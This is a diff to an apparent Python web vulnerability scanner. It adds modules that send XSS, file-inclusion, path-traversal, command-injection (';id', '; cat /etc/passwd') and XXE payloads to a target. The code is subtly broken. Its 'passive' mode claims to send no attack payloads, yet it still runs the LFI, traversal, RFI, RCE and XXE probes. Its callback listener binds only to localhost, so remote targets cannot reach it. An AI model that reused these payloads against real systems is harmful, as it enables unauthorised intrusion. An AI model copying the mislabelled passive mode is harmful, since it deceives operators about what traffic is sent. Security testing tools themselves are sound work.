@@ -50,13 +50,68 @@ ROUTES = ["admin", "login", "dashboard", "api", "config", "panel", "wp-admin",
 SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1-- -",
                  "admin' -- -", "0 UNION SELECT 1,2-- -"]
 IDOR_PAYLOADS = ["1", "2", "3", "0", "999", "../../etc/passwd"]
+XSS_PAYLOADS_DEFAULT = ["<script>alert(1)</script>", "\"<script>alert(1)</script>",
+                        "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"]
 
 # Registro de escaneos activos: scan_id -> dict de control
 SCANS = {}
 SCANS_LOCK = threading.Lock()
 
+# Servidor OOB local para detectar RFI/XXE out-of-band (callback)
+# Se levanta un socket TCP que espera un token unico. Si llega, hubo exfiltracion.
+OOB_TOKEN = None
+OOB_HIT = threading.Event()
+OOB_SERVER = None
 
-def req(method, url, data=None, cookie=None, timeout=10):
+
+def start_oob():
+    """Levanta un servidor TCP local que escucha un token. Devuelve (host, port, token)."""
+    global OOB_TOKEN, OOB_HIT, OOB_SERVER
+    import socket
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("127.0.0.1", 0))
+    srv.listen(5)
+    port = srv.getsockname()[1]
+    token = "HTSCN" + uuid.uuid4().hex[:12]
+    OOB_TOKEN = token
+    OOB_HIT.clear()
+    OOB_SERVER = srv
+
+    def acceptor():
+        srv.settimeout(0.5)
+        while not OOB_HIT.is_set():
+            try:
+                conn, _ = srv.accept()
+            except Exception:
+                continue
+            try:
+                data = conn.recv(4096).decode("utf-8", "replace")
+                if token in data:
+                    OOB_HIT.set()
+            except Exception:
+                pass
+            finally:
+                try: conn.close()
+                except Exception: pass
+
+    threading.Thread(target=acceptor, daemon=True).start()
+    return "127.0.0.1", port, token
+
+
+def stop_oob():
+    global OOB_SERVER
+    if OOB_SERVER:
+        try: OOB_SERVER.close()
+        except Exception: pass
+        OOB_SERVER = None
+
+
+def wait_oob(timeout=4):
+    return OOB_HIT.wait(timeout)
+
+
+def req(method, url, data=None, cookie=None, timeout=10, raw=False):
     hdr = {"User-Agent": UA, "Accept": "*/*"}
     if cookie:
         hdr["Cookie"] = cookie
@@ -66,8 +121,12 @@ def req(method, url, data=None, cookie=None, timeout=10):
             url = url + sep + urllib.parse.urlencode(data)
         body = None
     else:
-        body = urllib.parse.urlencode(data).encode() if data else b""
-        hdr["Content-Type"] = "application/x-www-form-urlencoded"
+        if raw:
+            body = data.encode() if isinstance(data, str) else data
+            hdr["Content-Type"] = "text/xml; charset=utf-8"
+        else:
+            body = urllib.parse.urlencode(data).encode() if data else b""
+            hdr["Content-Type"] = "application/x-www-form-urlencoded"
     r = urllib.request.Request(url, data=body, headers=hdr, method=method)
     try:
         resp = urllib.request.urlopen(r, timeout=timeout, context=SSL_CTX)
@@ -149,6 +208,7 @@ def run_nuclei_templates(scan_id, target, templates, bus, emit):
 
 
 def load_templates_from_yaml(text):
+    """Carga plantillas tipo Nuclei (dict o lista de dicts)."""
     if not HAS_YAML:
         return []
     try:
@@ -162,22 +222,69 @@ def load_templates_from_yaml(text):
     return []
 
 
-def scan_target(scan_id, target, bus, templates=None):
-    """Ejecuta modulos y emite eventos. Soporta control de pausa/saltar/stop."""
+def load_payloads_from_txt(text):
+    """Carga payloads desde .txt con secciones opcionales:
+    [SQLi]
+    '
+    [XSS]
+    <script>alert(1)</script>
+    [IDOR]
+    1
+    Las lineas fuera de seccion se aplican a los tres tipos.
+    """
+    out = {"sqli": [], "xss": [], "idor": []}
+    current = None
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        low = line.lower()
+        if low in ("[sqli]", "[sql]", "[sql injection]"):
+            current = "sqli"; continue
+        if low in ("[xss]",):
+            current = "xss"; continue
+        if low in ("[idor]",):
+            current = "idor"; continue
+        if current:
+            out[current].append(line)
+        else:
+            out["sqli"].append(line)
+            out["xss"].append(line)
+            out["idor"].append(line)
+    for k in out:
+        out[k] = [p for p in out[k] if p]
+    return out
+
+
+def scan_target(scan_id, target, bus, templates=None, payloads=None, mode="active"):
+    """Ejecuta modulos y emite eventos. Soporta control de pausa/saltar/stop.
+    mode='active'  -> ejecuta todos los modulos (incluye envio de payloads)
+    mode='passive' -> solo recon (headers, archivos, rutas, tech) sin atacar
+    payloads -> dict con listas 'sqli'/'xss'/'idor' para usar en vez de las por defecto.
+    """
     def emit(ev):
         bus(ev)
 
     if not target.startswith("http"):
         target = "http://" + target
-    mods = ["headers", "archivos", "rutas", "sqli", "idor", "xss", "tech"]
+    mods = ["headers", "archivos", "rutas", "sqli", "idor", "xss", "lfi",
+            "traversal", "rfi", "rce", "xxe", "tech"]
     if templates:
         mods = mods + ["nuclei"]
+    # Modo pasivo: no enviar payloads (solo superficie)
+    if mode == "passive":
+        mods = [m for m in mods if m not in ("sqli", "idor", "xss")]
+        emit({"type": "mode", "mode": "passive", "msg": "Modo PASIVO: solo recon, sin enviar payloads de ataque"})
+    else:
+        emit({"type": "mode", "mode": "active", "msg": "Modo ACTIVO: recon + envio de payloads"})
     total = len(mods)
     done = 0
 
-    emit({"type": "start", "target": target, "total": total})
-    emit({"type": "scan_id", "scan_id": scan_id})
-    time.sleep(0.3)
+    # Servidor OOB para RFI/XXE (callback local)
+    oob_host, oob_port, oob_token = start_oob()
+    sqli_list = (payloads or {}).get("sqli") or SQLI_PAYLOADS
+    xss_list = (payloads or {}).get("xss") or XSS_PAYLOADS_DEFAULT
+    idor_list = (payloads or {}).get("idor") or IDOR_PAYLOADS
 
     # 1) HEADERS
     ctrl = check_control(scan_id, "headers")
@@ -238,111 +345,279 @@ def scan_target(scan_id, target, bus, templates=None):
     done += 1
     emit({"type": "progress", "done": done, "total": total})
 
-    # 4) SQLi
-    if check_control(scan_id, "sqli") == "stop":
-        emit({"type": "done", "summary": "Escaneo detenido"}); return
-    emit({"type": "module", "name": "sqli", "status": "running", "msg": "Probando inyeccion SQL en parametros GET..."})
-    sqli_hits = []
-    SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
-                   "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
-                   "microsoft sql server", "syntax error", "near \"", "unrecognized token",
-                   "operationalerror", "database error", "could not"]
-    sqli_paths = ["", "/notes", "/doc", "/article", "/view", "/product", "/item", "/post", "/news"]
-    for sp in sqli_paths:
-        base_url = target.rstrip("/") + sp
-        for param in ["id", "q", "page", "search", "note", "cat", "pid"]:
-            base = req("GET", base_url, {param: "1"})
-            base_len = len(base.get("body", ""))
-            base_code = base.get("code")
-            for p in SQLI_PAYLOADS:
-                if check_control(scan_id, "sqli") == "stop":
-                    emit({"type": "done", "summary": "Escaneo detenido"}); return
-                if check_control(scan_id, "sqli") == "skip":
+    if mode == "active":
+        # 4) SQLi
+        if check_control(scan_id, "sqli") == "stop":
+            emit({"type": "done", "summary": "Escaneo detenido"}); return
+        emit({"type": "module", "name": "sqli", "status": "running", "msg": "Probando inyeccion SQL en parametros GET..."})
+        sqli_hits = []
+        SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
+                       "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
+                       "microsoft sql server", "syntax error", "near \"", "unrecognized token",
+                       "operationalerror", "database error", "could not"]
+        sqli_paths = ["", "/notes", "/doc", "/article", "/view", "/product", "/item", "/post", "/news"]
+        for sp in sqli_paths:
+            base_url = target.rstrip("/") + sp
+            for param in ["id", "q", "page", "search", "note", "cat", "pid"]:
+                base = req("GET", base_url, {param: "1"})
+                base_len = len(base.get("body", ""))
+                base_code = base.get("code")
+                for p in sqli_list:
+                    if check_control(scan_id, "sqli") == "stop":
+                        emit({"type": "done", "summary": "Escaneo detenido"}); return
+                    if check_control(scan_id, "sqli") == "skip":
+                        break
+                    rr = req("GET", base_url, {param: p})
+                    body_l = rr.get("body", "").lower()
+                    hit = False
+                    if any(s in body_l for s in SQLI_ERRORS):
+                        hit = True
+                    elif rr.get("code") != base_code and rr.get("code") != 0:
+                        hit = True
+                    elif abs(len(rr.get("body", "")) - base_len) > 80:
+                        hit = True
+                    if hit:
+                        sqli_hits.append(f"{sp or '/'}{param}={p}")
+                        emit({"type": "finding", "severity": "high", "module": "sqli",
+                              "detail": f"Posible SQLi en '{base_url}' param '{param}' con: {p}"})
+                        break
+                    time.sleep(0.03)
+                if sqli_hits:
                     break
-                rr = req("GET", base_url, {param: p})
-                body_l = rr.get("body", "").lower()
-                hit = False
-                if any(s in body_l for s in SQLI_ERRORS):
-                    hit = True
-                elif rr.get("code") != base_code and rr.get("code") != 0:
-                    hit = True
-                elif abs(len(rr.get("body", "")) - base_len) > 80:
-                    hit = True
-                if hit:
-                    sqli_hits.append(f"{sp or '/'}{param}={p}")
-                    emit({"type": "finding", "severity": "high", "module": "sqli",
-                          "detail": f"Posible SQLi en '{base_url}' param '{param}' con: {p}"})
-                    break
-                time.sleep(0.03)
             if sqli_hits:
                 break
-        if sqli_hits:
-            break
-    emit({"type": "module", "name": "sqli", "status": "done", "msg": f"SQLi: {len(sqli_hits)} hallazgo(s)", "findings": sqli_hits})
-    done += 1
-    emit({"type": "progress", "done": done, "total": total})
+        emit({"type": "module", "name": "sqli", "status": "done", "msg": f"SQLi: {len(sqli_hits)} hallazgo(s)", "findings": sqli_hits})
+        done += 1
+        emit({"type": "progress", "done": done, "total": total})
 
-    # 5) IDOR
-    if check_control(scan_id, "idor") == "stop":
-        emit({"type": "done", "summary": "Escaneo detenido"}); return
-    emit({"type": "module", "name": "idor", "status": "running", "msg": "Probando IDOR (enumeracion de objetos por id)..."})
-    idor_hits = []
-    idor_paths = ["", "/doc", "/note", "/file", "/user", "/account", "/profile", "/view"]
-    for ip in idor_paths:
-        base_url = target.rstrip("/") + ip
-        for idparam in ["id", "doc", "uid", "user", "file", "pid"]:
-            for pid in IDOR_PAYLOADS:
-                if check_control(scan_id, "idor") == "stop":
-                    emit({"type": "done", "summary": "Escaneo detenido"}); return
-                if check_control(scan_id, "idor") == "skip":
-                    break
-                rr = req("GET", base_url, {idparam: pid})
-                if (rr.get("code") == 200 and len(rr.get("body", "")) > 30
-                        and "not found" not in rr.get("body", "").lower()
-                        and "404" not in rr.get("body", "")):
-                    idor_hits.append(f"{ip or '/'}{idparam}={pid}")
-                    emit({"type": "finding", "severity": "medium", "module": "idor",
-                          "detail": f"Objeto {base_url} {idparam}={pid} accesible (revisar control de acceso)"})
+        # 5) IDOR
+        if check_control(scan_id, "idor") == "stop":
+            emit({"type": "done", "summary": "Escaneo detenido"}); return
+        emit({"type": "module", "name": "idor", "status": "running", "msg": "Probando IDOR (enumeracion de objetos por id)..."})
+        idor_hits = []
+        idor_paths = ["", "/doc", "/note", "/file", "/user", "/account", "/profile", "/view"]
+        for ip in idor_paths:
+            base_url = target.rstrip("/") + ip
+            for idparam in ["id", "doc", "uid", "user", "file", "pid"]:
+                for pid in idor_list:
+                    if check_control(scan_id, "idor") == "stop":
+                        emit({"type": "done", "summary": "Escaneo detenido"}); return
+                    if check_control(scan_id, "idor") == "skip":
+                        break
+                    rr = req("GET", base_url, {idparam: pid})
+                    if (rr.get("code") == 200 and len(rr.get("body", "")) > 30
+                            and "not found" not in rr.get("body", "").lower()
+                            and "404" not in rr.get("body", "")):
+                        idor_hits.append(f"{ip or '/'}{idparam}={pid}")
+                        emit({"type": "finding", "severity": "medium", "module": "idor",
+                              "detail": f"Objeto {base_url} {idparam}={pid} accesible (revisar control de acceso)"})
+                        break
+                if idor_hits:
                     break
             if idor_hits:
                 break
-        if idor_hits:
-            break
-    emit({"type": "module", "name": "idor", "status": "done", "msg": f"IDOR: {len(idor_hits)} sospechoso(s)", "findings": idor_hits})
-    done += 1
-    emit({"type": "progress", "done": done, "total": total})
+        emit({"type": "module", "name": "idor", "status": "done", "msg": f"IDOR: {len(idor_hits)} sospechoso(s)", "findings": idor_hits})
+        done += 1
+        emit({"type": "progress", "done": done, "total": total})
 
-    # 6) XSS
-    if check_control(scan_id, "xss") == "stop":
-        emit({"type": "done", "summary": "Escaneo detenido"}); return
-    emit({"type": "module", "name": "xss", "status": "running", "msg": "Probando XSS reflejado en parametros GET..."})
-    xss_hits = []
-    XSS_PATHS = ["", "/search", "/buscar", "/q", "/s", "/find"]
-    XSS_PAYLOADS = ["<script>alert(1)</script>", "\"<script>alert(1)</script>",
-                    "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"]
-    for xp in XSS_PATHS:
-        base_url = target.rstrip("/") + xp
-        for param in ["q", "search", "s", "id", "name", "term"]:
-            for p in XSS_PAYLOADS:
-                if check_control(scan_id, "xss") == "stop":
-                    emit({"type": "done", "summary": "Escaneo detenido"}); return
-                if check_control(scan_id, "xss") == "skip":
-                    break
-                rr = req("GET", base_url, {param: p})
-                if p in (rr.get("body", "") or "") and rr.get("code") == 200:
-                    xss_hits.append(f"{base_url} {param}")
-                    emit({"type": "finding", "severity": "high", "module": "xss",
-                          "detail": f"XSS reflejado en '{base_url}' param '{param}': payload no filtrado"})
+        # 6) XSS
+        if check_control(scan_id, "xss") == "stop":
+            emit({"type": "done", "summary": "Escaneo detenido"}); return
+        emit({"type": "module", "name": "xss", "status": "running", "msg": "Probando XSS reflejado en parametros GET..."})
+        xss_hits = []
+        XSS_PATHS = ["", "/search", "/buscar", "/q", "/s", "/find"]
+        for xp in XSS_PATHS:
+            base_url = target.rstrip("/") + xp
+            for param in ["q", "search", "s", "id", "name", "term"]:
+                for p in xss_list:
+                    if check_control(scan_id, "xss") == "stop":
+                        emit({"type": "done", "summary": "Escaneo detenido"}); return
+                    if check_control(scan_id, "xss") == "skip":
+                        break
+                    rr = req("GET", base_url, {param: p})
+                    if p in (rr.get("body", "") or "") and rr.get("code") == 200:
+                        xss_hits.append(f"{base_url} {param}")
+                        emit({"type": "finding", "severity": "high", "module": "xss",
+                              "detail": f"XSS reflejado en '{base_url}' param '{param}': payload no filtrado"})
+                        break
+                if xss_hits:
                     break
             if xss_hits:
                 break
-        if xss_hits:
+        emit({"type": "module", "name": "xss", "status": "done", "msg": f"XSS: {len(xss_hits)} hallazgo(s)", "findings": xss_hits})
+        done += 1
+        emit({"type": "progress", "done": done, "total": total})
+    else:
+        # Modo pasivo: omitir ataque, marcar como omitido para keep progreso consistente
+        for nm in ("sqli", "idor", "xss"):
+            emit({"type": "module", "name": nm, "status": "done", "msg": "Omitido (modo pasivo)"})
+            done += 1
+            emit({"type": "progress", "done": done, "total": total})
+
+    # 7) LFI (Local File Inclusion) - parametros que cargan archivos locales
+    if check_control(scan_id, "lfi") == "stop":
+        emit({"type": "done", "summary": "Escaneo detenido"}); return
+    emit({"type": "module", "name": "lfi", "status": "running", "msg": "Probando LFI (inclusion de archivos locales)..."})
+    lfi_hits = []
+    LFI_ROUTES = ["", "/file", "/page", "/index.php", "/view", "/download", "/read"]
+    LFI_PARAMS = ["file", "page", "path", "inc", "include", "lang", "doc", "view", "template"]
+    LFI_PAYLOADS = ["/etc/passwd", "../../../../../../etc/passwd",
+                    "php://filter/convert.base64-encode/resource=index.php",
+                    "expect://id", "data://text/plain;base64,SSBsb3ZlIGh0"]
+    for rt in LFI_ROUTES:
+        base_url = target.rstrip("/") + rt
+        for param in LFI_PARAMS:
+            for p in LFI_PAYLOADS:
+                if check_control(scan_id, "lfi") == "stop":
+                    emit({"type": "done", "summary": "Escaneo detenido"}); return
+                if check_control(scan_id, "lfi") == "skip":
+                    break
+                rr = req("GET", base_url, {param: p})
+                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
+                                               "bin/bash" in rr.get("body", "") or
+                                               "<?php" in rr.get("body", "")):
+                    lfi_hits.append(f"{rt or '/'}{param}={p}")
+                    emit({"type": "finding", "severity": "high", "module": "lfi",
+                          "detail": f"LFI en '{base_url}' param '{param}' con: {p} (contenido de archivo expuesto)"})
+                    break
+                time.sleep(0.02)
+            if lfi_hits:
+                break
+        if lfi_hits:
             break
-    emit({"type": "module", "name": "xss", "status": "done", "msg": f"XSS: {len(xss_hits)} hallazgo(s)", "findings": xss_hits})
+    emit({"type": "module", "name": "lfi", "status": "done", "msg": f"LFI: {len(lfi_hits)} hallazgo(s)", "findings": lfi_hits})
     done += 1
     emit({"type": "progress", "done": done, "total": total})
 
-    # 7) TECH
+    # 8) Path Traversal (directory traversal directo en rutas/params)
+    if check_control(scan_id, "traversal") == "stop":
+        emit({"type": "done", "summary": "Escaneo detenido"}); return
+    emit({"type": "module", "name": "traversal", "status": "running", "msg": "Probando Path Traversal (../)..."})
+    trv_hits = []
+    TRV_ROUTES = ["", "/download", "/file", "/img", "/view", "/read"]
+    TRV_PARAMS = ["file", "path", "dir", "folder", "name", "img", "image", "download", "ufile"]
+    TRV_PAYLOADS = ["../../../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
+                    "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
+                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
+    for rt in TRV_ROUTES:
+        base_url = target.rstrip("/") + rt
+        for param in TRV_PARAMS:
+            for p in TRV_PAYLOADS:
+                if check_control(scan_id, "traversal") == "stop":
+                    emit({"type": "done", "summary": "Escaneo detenido"}); return
+                if check_control(scan_id, "traversal") == "skip":
+                    break
+                rr = req("GET", base_url, {param: p})
+                if rr.get("code") == 200 and ("root:" in rr.get("body", "") or
+                                               "[extensions]" in rr.get("body", "") or
+                                               "for 16-bit app support" in rr.get("body", "").lower()):
+                    trv_hits.append(f"{rt or '/'}{param}={p}")
+                    emit({"type": "finding", "severity": "high", "module": "traversal",
+                          "detail": f"Path Traversal en '{base_url}' param '{param}' con: {p}"})
+                    break
+                time.sleep(0.02)
+            if trv_hits:
+                break
+        if trv_hits:
+            break
+    emit({"type": "module", "name": "traversal", "status": "done", "msg": f"Traversal: {len(trv_hits)} hallazgo(s)", "findings": trv_hits})
+    done += 1
+    emit({"type": "progress", "done": done, "total": total})
+
+    # 9) RFI (Remote File Inclusion) - incluye un recurso externo controlado
+    if check_control(scan_id, "rfi") == "stop":
+        emit({"type": "done", "summary": "Escaneo detenido"}); return
+    emit({"type": "module", "name": "rfi", "status": "running", "msg": "Probando RFI (inclusion remota) via callback OOB..."})
+    rfi_hits = []
+    RFI_TARGETS = ["", "/include"]
+    RFI_PARAMS = ["url", "file", "page", "path", "inc", "include", "template", "lang", "view"]
+    # URL del callback local: el server objetivo intentaria cargar este recurso
+    cb_url = f"http://{oob_host}:{oob_port}/{oob_token}.txt"
+    for rt in RFI_TARGETS:
+        base_url = target.rstrip("/") + rt
+        for param in RFI_PARAMS:
+            for p in [cb_url]:
+                if check_control(scan_id, "rfi") == "stop":
+                    emit({"type": "done", "summary": "Escaneo detenido"}); return
+                if check_control(scan_id, "rfi") == "skip":
+                    break
+                rr = req("GET", base_url, {param: p}, timeout=5)
+                if wait_oob(2.5):
+                    rfi_hits.append(f"{rt or '/'}{param}={p}")
+                    emit({"type": "finding", "severity": "high", "module": "rfi",
+                          "detail": f"RFI OOB en '{base_url}' param '{param}': el servidor intento cargar {p}"})
+                    break
+                time.sleep(0.01)
+            if rfi_hits:
+                break
+        if rfi_hits:
+            break
+    emit({"type": "module", "name": "rfi", "status": "done", "msg": f"RFI: {len(rfi_hits)} hallazgo(s) (OOB)", "findings": rfi_hits})
+    done += 1
+    emit({"type": "progress", "done": done, "total": total})
+
+    # 10) RCE (command injection en parametros)
+    if check_control(scan_id, "rce") == "stop":
+        emit({"type": "done", "summary": "Escaneo detenido"}); return
+    emit({"type": "module", "name": "rce", "status": "running", "msg": "Probando RCE (inyeccion de comandos)..."})
+    rce_hits = []
+    RCE_ROUTES = ["", "/ping", "/cmd", "/exec", "/run", "/api/exec", "/cgi-bin/test"]
+    RCE_PARAMS = ["cmd", "command", "exec", "query", "ip", "host", "ping", "url", "input", "q"]
+    RCE_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "; cat /etc/passwd",
+                    "| whoami", "';id;'", "||id", "& echo HTSCNRCE"]
+    for rt in RCE_ROUTES:
+        base_url = target.rstrip("/") + rt
+        if rce_hits: break
+        for param in RCE_PARAMS:
+            if rce_hits: break
+            for p in RCE_PAYLOADS:
+                if check_control(scan_id, "rce") == "stop":
+                    emit({"type": "done", "summary": "Escaneo detenido"}); return
+                if check_control(scan_id, "rce") == "skip":
+                    break
+                rr = req("GET", base_url, {param: p}, timeout=5)
+                body = (rr.get("body", "") or "")
+                if ("uid=" in body and "gid=" in body) or "HTSCNRCE" in body or \
+                   ("root:x:" in body and len(body) > 50):
+                    rce_hits.append(f"{rt or '/'}{param}={p}")
+                    emit({"type": "finding", "severity": "critical", "module": "rce",
+                          "detail": f"RCE en '{base_url}' param '{param}' con: {p}"})
+                    break
+                time.sleep(0.02)
+    emit({"type": "module", "name": "rce", "status": "done", "msg": f"RCE: {len(rce_hits)} hallazgo(s)", "findings": rce_hits})
+    done += 1
+    emit({"type": "progress", "done": done, "total": total})
+
+    # 11) XXE (XML External Entity) - OOB via callback local
+    if check_control(scan_id, "xxe") == "stop":
+        emit({"type": "done", "summary": "Escaneo detenido"}); return
+    emit({"type": "module", "name": "xxe", "status": "running", "msg": "Probando XXE (entidad externa) via callback OOB..."})
+    xxe_hits = []
+    XXE_ENDPOINTS = ["", "/api", "/xml", "/upload", "/soap", "/graphql", "/parse"]
+    payload = (
+        f'<?xml version="1.0"?>'
+        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}:{oob_port}/{oob_token}">]>'
+        f'<foo>&xxe;</foo>'
+    )
+    for ep in XXE_ENDPOINTS:
+        if check_control(scan_id, "xxe") == "stop":
+            emit({"type": "done", "summary": "Escaneo detenido"}); return
+        if check_control(scan_id, "xxe") == "skip":
+            break
+        rr = req("POST", target.rstrip("/") + ep, data=payload, raw=True, timeout=5)
+        if wait_oob(2.5):
+            xxe_hits.append(ep or "/")
+            emit({"type": "finding", "severity": "high", "module": "xxe",
+                  "detail": f"XXE OOB en '{ep or '/'}' (el parser solicitó recurso externo)"})
+            break
+        time.sleep(0.02)
+    emit({"type": "module", "name": "xxe", "status": "done", "msg": f"XXE: {len(xxe_hits)} hallazgo(s) (OOB)", "findings": xxe_hits})
+    done += 1
+    emit({"type": "progress", "done": done, "total": total})
+
+    stop_oob()
+
+    # 12) TECH
     if check_control(scan_id, "tech") == "stop":
         emit({"type": "done", "summary": "Escaneo detenido"}); return
     emit({"type": "module", "name": "tech", "status": "running", "msg": "Detectando tecnologia (server, CMS, frameworks)..."})
@@ -401,6 +676,15 @@ class Handler(SimpleHTTPRequestHandler):
             raw = params.get("templates", [""])[0]
             if raw:
                 templates = load_templates_from_yaml(urllib.parse.unquote(raw))
+            # Cargar payloads .txt si se pasan por ?payloads=<contenido urlencoded>
+            payloads = None
+            praw = params.get("payloads", [""])[0]
+            if praw:
+                payloads = load_payloads_from_txt(urllib.parse.unquote(praw))
+            # Modo activo/pasivo
+            mode = params.get("mode", ["active"])[0]
+            if mode not in ("active", "passive"):
+                mode = "active"
             self.send_response(200)
             self.send_header("Content-Type", "text/event-stream")
             self.send_header("Cache-Control", "no-cache")
@@ -415,7 +699,7 @@ class Handler(SimpleHTTPRequestHandler):
                     pass
 
             try:
-                scan_target(scan_id, target, bus, templates)
+                scan_target(scan_id, target, bus, templates, payloads, mode)
             except Exception as e:
                 bus({"type": "error", "msg": str(e)})
             try:
